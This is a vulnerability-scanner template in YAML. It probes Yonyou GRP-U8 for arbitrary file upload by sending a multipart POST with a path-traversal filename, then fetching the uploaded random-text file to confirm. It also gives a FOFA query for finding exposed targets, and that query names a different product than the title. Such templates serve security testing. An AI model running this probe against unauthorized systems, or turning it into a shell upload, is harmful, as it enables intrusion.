id: yongyouOA-Cloud-UploadFileData-file-upload

info:
  name: 用友GRP-U8-UploadFileData任意文件上传
  author: cnaq
  severity: critical
  tags: yonyou,changjietong,bjxsec,yonyouoa
  description: fofa   app="畅捷通-TPlus"
variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}.txt"
  file_content: "{{to_lower(rand_text_alpha(26))}}"
requests:
  - raw:
      - |
        POST /UploadFileData?action=upload_file&filename=../.jtstpm.jsp HTTP/1.0
        Host: {{Hostname}}
        Connection: close
        Content-Length: 327
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzassocxz
        Cookie: JSESSIONID=0333BDE70A73627168772D5C50956A74
        Dfpajaxreq: 1.0
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        X-Requested-With: XMLHttpRequest
        Accept-Encoding: gzip

        ------WebKitFormBoundaryzassocxz
        Content-Disposition: form-data; name="upload"; filename="{{file_name}}"
        Content-Type: application/octet-stream

        {{file_content}}
        ------WebKitFormBoundaryzassocxz
        Content-Disposition: form-data; name="submit"

        submit
        ------WebKitFormBoundaryzassocxz--
      
      - |
        GET /R9iPortal/{{file_name}} HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: word
        words:
          - "{{file_content}}"
        part: body

